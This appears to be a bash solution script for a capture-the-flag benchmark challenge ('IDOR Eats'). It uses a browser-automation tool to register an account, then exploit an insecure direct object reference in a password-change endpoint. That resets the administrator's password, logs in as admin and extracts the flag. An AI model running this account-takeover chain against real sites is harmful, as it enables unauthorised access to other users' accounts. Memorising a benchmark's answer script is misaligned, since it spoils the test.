#!/usr/bin/env bash
# XBEN-069-24 — "IDOR Eats" (tags: idor, privilege_escalation)
#
# `api/change_password.php` verifies the old password of the *session* user and
# then writes the new one to the row named by `$_POST['userId']`. The check and
# the write are about different people. So: register, prove you know your own
# password, and set the administrator's.
#
# Four requests, none of which the browser would make on its own with these
# values. The whole chain is `--set` edits on one captured request, and every
# step is in the session's receipts afterwards, which is what makes a finding
# like this reproducible by somebody who was not watching.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben069-$$"
VICTIM="${2:-7}"          # the ADMIN row in the seeded database
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/register.php" --session "$SESSION" --new --capture >/dev/null

# 1. An account of our own, so there is a password we can prove we know.
"$H5I" websec replay req_0 --create --set 'method=POST' --set 'path=/api/register.php' \
    --set 'form.username=poc1' --set 'form.email=poc1@example.test' \
    --set 'form.password=Passw0rd!' --session "$SESSION" >/dev/null

# 2. Log in as it. The session cookie is the jar's from here on.
"$H5I" websec replay req_0 --create --set 'method=POST' --set 'path=/api/login.php' \
    --set 'form.username=poc1' --set 'form.password=Passw0rd!' \
    --session "$SESSION" >/dev/null

# 3. Our old password, their row.
"$H5I" websec replay req_0 --create --set 'method=POST' --set 'path=/api/change_password.php' \
    --set 'form.oldPassword=Passw0rd!' \
    --set 'form.newPassword=Pwned123!' --set 'form.confirmPassword=Pwned123!' \
    --set "form.userId=$VICTIM" --session "$SESSION" >/dev/null

# 4. Log in as the administrator with the password we just set. The profile
#    page prints the flag for `role = ADMIN` and for nobody else.
"$H5I" websec replay req_0 --create --set 'method=POST' --set 'path=/api/login.php' \
    --set 'form.username=admin' --set 'form.password=Pwned123!' \
    --session "$SESSION" >/dev/null
"$H5I" browser navigate "$URL/profile.php" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
